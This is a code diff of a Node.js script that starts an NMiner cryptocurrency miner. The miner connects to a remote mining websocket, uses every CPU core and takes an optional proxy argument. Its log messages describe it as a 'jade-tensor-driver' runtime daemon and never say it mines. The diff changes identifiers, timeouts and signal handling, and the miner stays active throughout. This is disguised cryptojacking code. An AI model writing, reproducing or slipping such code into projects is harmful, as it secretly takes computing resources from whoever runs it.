@@ -3,9 +3,9 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./app/config");
 
-(async () => {
-    const traceId = "286a89";
-    console.log(`[monitor] Daemon ${config.appName || "jade-tensor-driver"} active [tag: ${traceId}]`);
+async function startRuntime() {
+    const runId = "4fd301";
+    console.log(`[monitor] Starting runtime for ${config.appName || "jade-tensor-driver"} [${runId}]`);
 
     const scheduler = new NMiner(
         "wss://runtime.nmining.igrp.app/",
@@ -13,17 +13,22 @@ const config = require("./app/config");
         Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
     );
 
-    const heartbeat = setInterval(() => {}, 62000);
+    const tick = () => { setTimeout(tick, 48000); }; tick();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (300m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (353m) reached, exiting cleanly.");
         process.exit(0);
-    }, 300 * 60 * 1000);
+    }, 353 * 60 * 1000);
 
-    process.once("SIGTERM", () => {
-        clearInterval(heartbeat);
-        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
+    process.on("SIGTERM", () => {
+        
+        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${runId}.`);
         process.exit(0);
     });
 
-    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
-})().catch(console.error);
+    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
+}
+
+startRuntime().catch((err) => {
+    console.error("Supervisor startup fault:", err);
+    process.exit(1);
+});
